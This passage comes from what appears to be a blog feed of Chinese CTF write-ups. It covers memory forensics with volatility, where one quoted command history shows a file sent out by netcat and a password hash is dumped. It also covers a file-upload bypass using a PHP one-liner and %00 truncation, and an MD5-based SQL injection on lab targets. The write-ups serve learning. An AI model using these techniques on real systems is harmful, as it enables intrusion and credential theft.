src="https://img-blog.csdnimg.cn/20201002192848855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>压缩包密码也有了<code>!@#$%67*()-+</code><br>文件里就是这样的一堆数字，看着挺熟悉的，之前见过、<br><img src="https://img-blog.csdnimg.cn/20201002193024931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>与之类似的题—<a href="https://blog.csdn.net/qq_45836474/article/details/107767955?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160163888619725271711782%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160163888619725271711782&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107767955.pc_v2_rank_blog_default&utm_term=127%20255%2063%20191&spm=1018.2118.3001.4187#t12">[SWPU2019]Network</a><br>然后就使用脚本，进行批量转换，贴个大佬的脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a_file<span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> a_file<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>bins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>    bins<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>stringBins <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>bins<span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>stringBins<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>stringBins<span class="token punctuation">[</span>num<span class="token punctuation">:</span>num<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    num<span class="token operator">+=</span><span class="token number">8</span> <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201002195428799.png#pic_center" alt="m0re" loading="lazy"><br>得到了rar压缩包的密码，套路是没有什么变化的。<br>解压得到fffflag.zip，但是解压拿到的是一堆文件，所以先使用file命令查看一下这个压缩包的文件类型。发现是word文档。<br><img src="https://img-blog.csdnimg.cn/20201002195715973.png#pic_center" alt="m0re" loading="lazy"><br>改下后缀，查看文档。<br><img src="https://img-blog.csdnimg.cn/20201002195949875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>复制到记事本中看<br><img src="https://img-blog.csdnimg.cn/20201002201824853.png" alt="m0re" loading="lazy"><br>看了wp，是base64编码，这个还真的看不出来、菜。<br><img src="https://img-blog.csdnimg.cn/20201002202711964.png#pic_center" alt="m0re" loading="lazy"><br>然后看0和1的分布<br><img src="https://img-blog.csdnimg.cn/20201002203459980.png#pic_center" alt="m0re" loading="lazy"><br>所以flag是<code>He1Lo_mi5c~</code></p><h2 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h2><p>题目来源：BUUCTF[ACTF新生赛2020]swp<br>下载得到tar压缩包，所以在kali中进行解题。<br><img src="https://img-blog.csdnimg.cn/20201003103744751.png#pic_center" alt="m0re" loading="lazy"><br>最后得到一个流量包，打开wireshark分析查看，随手翻了一下，看到有http请求。于是尝试导出http对象，看到好多文件，还看到了<code>hint.html</code>和一个压缩包。<br>于是先导出来再说。<br><img src="https://img-blog.csdnimg.cn/20201003103958281.png#pic_center" alt="m0re" loading="lazy"><br>压缩包加密了，所以再拉到windows中打开，<br>对了，还有hint，先查看hint，<br><img src="https://img-blog.csdnimg.cn/20201003104216266.png#pic_center" alt="m0re" loading="lazy"><br>不需要密码，说明压缩包要么是简单爆破得到，要么是伪加密。打开却看到是这样的。<br><img src="https://img-blog.csdnimg.cn/20201003104311959.png#pic_center" alt="m0re" loading="lazy"><br>明白了为什么不用密码了，直接打开flag.swp文件就可以了。就能找到flag<br><img src="https://img-blog.csdnimg.cn/20201003104424708.png#pic_center" alt="m0re" loading="lazy"><br>swp文件在linux系统中是隐藏文件，是看不到的，但是在windows系统中是可以看到的，这里直接用记事本打开就可以。<br>扩展：一般隐藏文件使用<code>ls</code>命令查看<br><img src="https://img-blog.csdnimg.cn/20201003104754983.png#pic_center" alt="m0re" loading="lazy"></p><h1 id="loading"><a href="#loading" class="headerlink" title="loading"></a>loading</h1><p>本周内容结束，下周继续。这周做的题，学到了一些关于操作系统的基础内容。</p><blockquote><p>雄鹰不为暴风折翼，群狼不因长夜畏惧！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子取证</title>
      <link href="/posts/112d2fe4/"/>
      <url>/posts/112d2fe4/</url>
      
        <content type="html"><![CDATA[<p>前言：比赛看到取证类的题目，但是没了解过，所以很尴尬。比赛那道题没做出来，没有什么思路，所以等下师傅们的wp看看之后在进行复现。然后就在CTF平台上找了取证类的题目，进行学习一下。</p><h2 id="知识了解"><a href="#知识了解" class="headerlink" title="知识了解"></a>知识了解</h2><h3 id="取证方法"><a href="#取证方法" class="headerlink" title="取证方法"></a>取证方法</h3><ul><li>活取证<br>—抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转存内存信息<br>—使用未受感染的干净程序执行取证<br>—U盘/网络 存储收集到的数据</li><li>死取证<br>—关机后制作硬盘镜像、分析镜像（MBR、GPT、LVM）<h3 id="取证工具"><a href="#取证工具" class="headerlink" title="取证工具"></a>取证工具</h3>目前学习kali中部分取证工具的使用。<br>内存dump工具<ul><li>内存文件与内存大小接近或者稍微大点，raw格式。</li></ul></li></ul><p>取证工具volatility使用：<br>分析内存文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> volatility imageinfo -f xp.raw<span class="token comment">#文件信息，关注profile</span><span class="token operator">>></span><span class="token operator">></span> volatility hivelist -f xp.raw --profile<span class="token operator">=</span>WinXPSP3x86<span class="token comment">#数据库文件</span><span class="token operator">>></span><span class="token operator">></span> volatility -f xp.raw --profile<span class="token operator">=</span>WinXPSP3x86 hivedump -o 0xe124f8a8<span class="token comment">#按虚拟机内存地址查看注册表内容</span><span class="token operator">>></span><span class="token operator">></span> volatility -f xp.raw --profile<span class="token operator">=</span>WinXPSP3x86 printkey -K <span class="token string">"SAM\Domains\Account\User\Names"</span><span class="token comment">#用户账号</span><span class="token operator">>></span><span class="token operator">></span> volatility -f xp.raw --profile<span class="token operator">=</span>WinXPSP3x86 printkey -K <span class="token string">"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogin"</span><span class="token comment">#最后登录的用户</span><span class="token operator">>></span><span class="token operator">></span> volatility -f xp.raw --profile<span class="token operator">=</span>WinXPSP3x86 userassist <span class="token comment">#正在运行的程序、运行过多少次、最后一次运行时间等</span></code></pre><h4 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h4><p>我的是2020版本的kali，没有自带volatility，但是包管理中有，直接使用命令安装</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> volatility</code></pre><p>很快就安装好啦，百度也可以找到很多教程。不再细说。<br>然后就利用几道题来测试一下。</p><h2 id="forensic"><a href="#forensic" class="headerlink" title="forensic"></a>forensic</h2><p>来自BUUCTF的题目。<br>下载后是一个512MB的raw文件，直接工具分析<br><img src="https://img-blog.csdnimg.cn/20200927143824929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这个有三个，一般是第一个。说一下，第一步，第一步必须先检测这个文件时什么系统生成的，后面的命令操作都需要profile，是必须指明操作系统的。所以这个很重要。</p><h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>使用工具时遇到这样的情况，<br><img src="https://img-blog.csdnimg.cn/20200927144222151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>报错信息：<code>No suggestion (Instantiated with no profile)</code><br>这个其实跟工具没关系，原因就是打开的文件不是符合规则的文件，也就是这个文件不是raw文件，所以没有suggest。昨天我一直以为是我的工具问题，着急半天，其实就是打开的文件不是volatility可以分析的文件。<br>OK，小插曲结束。<br>继续解题……<br>查看进程</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86_23418 pslist</code></pre><p><img src="https://img-blog.csdnimg.cn/20200927145756613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>注意这四个进程，<br><code>Dumpit.exe</code> 一款内存镜像提取工具。</p><p><code>TrueCrypt.exe</code> 一款磁盘加密工具。</p><p><code>Notepad.exe</code> windows自带的记事本。</p><p><code>Mspaint.exe</code> windows自带画图工具。</p><p>查看用户Home目录的文件，可以发现有一个用户保存的图片文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 filescan<span class="token operator">|</span><span class="token function">grep</span> -v Temporary <span class="token operator">|</span><span class="token function">grep</span> -v .dll<span class="token operator">|</span><span class="token function">grep</span> -E <span class="token string">'png|jpg|gif|zip|rar|7z|pdf'</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200927150012870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发现在picture中有个无标题的图片，<br>可以将这个图片dump下来</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 dumpfiles -Q 0x000000001efb29f8  --dump-dir<span class="token operator">=</span>./</code></pre><p>就可以在当前工作目录看到这个文件了。我的是在桌面。<br><img src="https://img-blog.csdnimg.cn/20200927150511469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>查看桌面文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Desktop"</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200927152117987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这个软件在桌面运行，还看到它的<code>LETHALBE3A-20190916-135515.raw </code>文件也在，这个文件是dumpit生成的，然后dump下这个文件<br><img src="https://img-blog.csdnimg.cn/20200927152641115.png#pic_center" alt="m0re" loading="lazy"><br>但是桌面上什么也没有，说明这个文件还没内容，也就是指明，在取证的时候，dumpit还在运行状态，所以raw里才没有数据。<br>然后可以dump下dumpit的内存镜像来试试。</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 memdump -p <span class="token number">3380</span> -D ./</code></pre><p><img src="https://img-blog.csdnimg.cn/20200927153059597.png#pic_center" alt="m0re" loading="lazy"><br>然后分析3380.dmp文件。<br>foremost分离得到一个包含flag.txt的一个文件。<br><img src="https://img-blog.csdnimg.cn/20200927153327864.png#pic_center" alt="m0re" loading="lazy"><br>找了好久发现在压缩包里<br><img src="https://img-blog.csdnimg.cn/2020092715350479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>密码就是之前的那个无标题的图片内容。<br><code>1YxfCQ6goYBD6Q</code><br><img src="https://img-blog.csdnimg.cn/20200927153843752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="未知题目"><a href="#未知题目" class="headerlink" title="未知题目"></a>未知题目</h2><p><img src="https://img-blog.csdnimg.cn/2020092715404867.png" alt="m0re" loading="lazy"><br>题目来源——<a href="https://www.freebuf.com/news/145262.html">https://www.freebuf.com/news/145262.html</a><br>同样的姿势，先查看操作系统的信息。使用imageinfo<br>发现是<code>WinXPSP2x86</code><br>题目说在桌面写着什么，可能是记事本，不过不确定，可以pslist列一下。<br><img src="https://img-blog.csdnimg.cn/20200927154743318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>看一遍，记事本才有可能写东西，所以直接列出notepad的内容</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f m0re.raw --profile<span class="token operator">=</span>WinXPSP2x86 notepad</code></pre><p>发现有一串编码。<br><img src="https://img-blog.csdnimg.cn/20200927154923143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">666C61677B57336C6563306D655F376F5F466F72336E356963737D</code></pre><p>符合base16编码的规则。所以进行解密得到第一个flag。<br>flag{W3lec0me_7o_For3n5ics}<br>第二个问题，小白的密码，<br>hashdump可以将内存中的NTML提取出来：</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f m0re.raw --profile<span class="token operator">=</span>WinXPSP2x86 hashdump</code></pre><p><img src="https://img-blog.csdnimg.cn/20200927155445846.png#pic_center" alt="m0re" loading="lazy"><br>找个在线网站进行破解<code>1e581aafa474dfadfdf83fc31e4fd4ea</code><br>破解得到flag{19950101}<br>果然一般都是生日当密码。<br>第三个<br>传送文件就需要连接外机，刚看到有nc，所以他一定是用nc来传输文件的，这样一来就有目标了。使用connscan插件查看<br><img src="https://img-blog.csdnimg.cn/2020092716120613.png#pic_center" alt="m0re" loading="lazy"><br>可以看到本地机器是192.168.57.21的1045端口去连接了远程的192.168.57.14的2333端口，进程号是120，知道进程号就可以使用psscan（进程池扫描插件）来获取信息。<br><img src="https://img-blog.csdnimg.cn/20200927161450519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>看到了确实是nc，而且还有cmd，则说明是在cmd的命令行下使用的nc连接的外机。使用cmdscan插件来查看命令历史记录。<br><img src="https://img-blog.csdnimg.cn/20200927161719352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>看到使用了命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">ipconfig<span class="token builtin class-name">cd</span> C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Netcat<span class="token function">nc</span> <span class="token number">192.168</span>.57.14 <span class="token number">2333</span> <span class="token operator">&lt;</span> P@ssW0rd_is_y0ur_bir7hd4y.zip</code></pre><p>传输的文件是<code>P@ssW0rd_is_y0ur_bir7hd4y.zip</code><br>可以使用memdump插件（转储进程的可寻址内存数据插件）导出使用nc发送的相关数据：</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f m0re.raw --profile<span class="token operator">=</span>WinXPSP2x86 memdump -p <span class="token number">120</span> --dump-dir<span class="token operator">=</span>./</code></pre><p>桌面生成一个120.dmp<br>跟上一题一样，foremost分离文件<br>有六个zip文件，挨个打开看看，输入密码19950101得到flag<br><img src="https://img-blog.csdnimg.cn/20200927162314561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>到此，内存取证入门。下次再详细地学习活取证和死取证</p><p>参考博客<br><a href="http://www.bubuko.com/infodetail-3418258.html">http://www.bubuko.com/infodetail-3418258.html</a><br><a href="https://www.freebuf.com/news/145262.html">内存取证三项CTF赛题详解</a></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次不一样的文件上传</title>
      <link href="/posts/2bb1b5bf/"/>
      <url>/posts/2bb1b5bf/</url>
      
        <content type="html"><![CDATA[<p>前言：这段时间刚开始做Jarvis OJ的web题，遇到一个ISCC2016的一个文件上传类的题，之前没见过。so，记录一下。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="https://img-blog.csdnimg.cn/20200922183851753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>按照文件上传的套路来进行解题，PHP文件不可以上传，只能上传jpg和GIF类型的图片。<br>尝试1：一句话木马，直接上传，发现前端验证。<br>尝试2：修改后缀，burp抓包改回php，发现后端验证或者文件类型验证。<br>尝试3：加上GIF89A标志。仍然失败。<br>图片马需要结合文件包含漏洞，暂时先放着。<br>先传一张正常的图片，成功上传会返回图片id。在view页面查看图片<br><img src="https://img-blog.csdnimg.cn/20200922192038381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>查看源码，发现文件储存目录uploads<br><img src="https://img-blog.csdnimg.cn/20200922192131373.png#pic_center" alt="m0re" loading="lazy"><br>可以直接访问到图片，尝试上传图片马，在burp中拼接一句话。再次上传，但是无法解析。<br>观察上传和查看的两个URL</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://web.jarvisoj.com:32785/index.php?page<span class="token operator">=</span>submithttp://web.jarvisoj.com:32785/index.php?page<span class="token operator">=</span>view</code></pre><p>验证是否存在文件包含漏洞<br><img src="https://img-blog.csdnimg.cn/20200922193918544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发现网站根目录<code>/opt/lampp/htdocs/index.php</code><br>还有一个，是page传入的参数后面都自动添加php后缀。<br>尝试使用php伪协议读取网站源码，<br><img src="https://img-blog.csdnimg.cn/20200922194424752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>直接包含<code>/opt/lampp/htdocs/index</code><br><img src="https://img-blog.csdnimg.cn/20200922194554322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>读取上传的jpg文件时，发现也自动添加php后缀。<br><img src="https://img-blog.csdnimg.cn/20200922195655944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后考虑截断<code>%00</code></p><p><img src="https://img-blog.csdnimg.cn/2020092219552535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后返回的也是should not，这里是一句话出了问题，所以尝试其他类型的木马。(看大师傅wp说是禁止了php标签。所以构造没有<code>&lt;?</code>标签的一句话)下面是一个一句话木马，尝试</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token single-quoted-string string">'php'</span><span class="token operator">></span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>制作一个图片马，上传成功后，自动解析<br><img src="https://img-blog.csdnimg.cn/20200922200201930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0" loading="lazy"><br>思路就这样，然后看一下，这道题可以学到什么知识。</p><h2 id="知识点-题后总结"><a href="#知识点-题后总结" class="headerlink" title="知识点(题后总结)"></a>知识点(题后总结)</h2><p>解题的时候，思路很重要。一步一步考虑，文件上传题，先做一些简单的上传验证一下各种过滤方式，看看什么被限制了，然后，根据前面总结的进行绕过，寻找可以利用的点，拿到flag。<br>这道题连接不上菜刀，看大师傅的wp说是绕过。这个目前还没了解过。<br>闲话少说，下面看看知识点</p><ol><li>关于<code>&lt;script language=&quot;php&quot;&gt;&lt;script&gt;</code>，在PHP7.0更新后就被废除了。<br><img src="https://img-blog.csdnimg.cn/20200922201852905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></li><li>然后一篇文章—<a href="https://www.freebuf.com/articles/web/9396.html">那些强悍的PHP一句话后门</a></li></ol><p>文件上传的姿势遇到再补充。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ—Web</title>
      <link href="/posts/d477b3b0/"/>
      <url>/posts/d477b3b0/</url>
      
        <content type="html"><![CDATA[<p><a name="93vek"></a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p><a name="kWjfG"></a></p><h3 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/37896303389d3860251a30ef29e16fc5.png" alt="image.png" loading="lazy"><br><br />使用51端口，但是修改端口的话，32770就不是这道题的了，所以应该是使用本地的端口51来访问。所以就需要用到curl命令。<img src="https://img-blog.csdnimg.cn/img_convert/ebeb969b0ac2e500f027a259e5a55530.png" alt="image.png" loading="lazy"><br /><img src="https://img-blog.csdnimg.cn/img_convert/9d473db12b5d6fc4c76ab77675a790c2.png" alt="image.png" loading="lazy"><br />curl命令可以进行学习一下，回头有空学习一下。<br><a name="en9Hj"></a></p><h3 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h3><p>本地访问，简单题，设置一下hosts文件就行，将题目网址加上去就OK。<br />也可以使用插件<br /><img src="https://img-blog.csdnimg.cn/img_convert/6f39de5031ff17932594966ff0367d17.png" alt="image.png" loading="lazy"><br />刷新一下得到flag<br /><img src="https://img-blog.csdnimg.cn/img_convert/247ee19eae65aa8a914695b45a345936.png" alt="image.png" loading="lazy"><br><a name="yHF8Q"></a></p><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>登录，但是尝试了几个弱口令，还进行了爆破，不过没有得到flag，所以抓包抓包看看返回结果<br /><img src="https://img-blog.csdnimg.cn/img_convert/f4c245b6f99671db6398c9468fc3b0bd.png" alt="image.png" loading="lazy"><br />这里有个hint，</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">"select * from `admin` where password='"</span><span class="token punctuation">.</span>md5<span class="token punctuation">(</span>$pass<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'"</span></code></pre><p>一条查询语句，pass经过md5加密，想起来之前的那个特殊例子。ffifdyop<br />看了我之前做得题发现，这个题跟那个是一样的[BJDCTF2020]Easy MD5<br /><img src="https://img-blog.csdnimg.cn/img_convert/a389536a8f5e79cb3f45ef1b390faf0c.png" alt="image.png" loading="lazy"><br><a name="NGkcy"></a></p><h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>这个就有点意思了，没有头绪，看了wp，下面自己解题过程<br />查看源码，发现base64字符串，<br /><img src="https://img-blog.csdnimg.cn/img_convert/82b7a43ba1f3a0864c140306f8080dbf.png" alt="image.png" loading="lazy"><br />先访问，<br /><img src="https://img-blog.csdnimg.cn/img_convert/4bd3bc0a48b47fde9aff2a06bc6f072b.png" alt="image.png" loading="lazy"><br />都是乱码，同时解出base64得到shield.jpg<br />这是一个文件包含，任意文件读取的漏洞，原因：谷歌浏览器是可以解析图片的，但是这个是图片，没有显示图片而是16进制，所以确定是文件包含漏洞了，<br />读取一下，showing.php<br />源代码中注释了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean 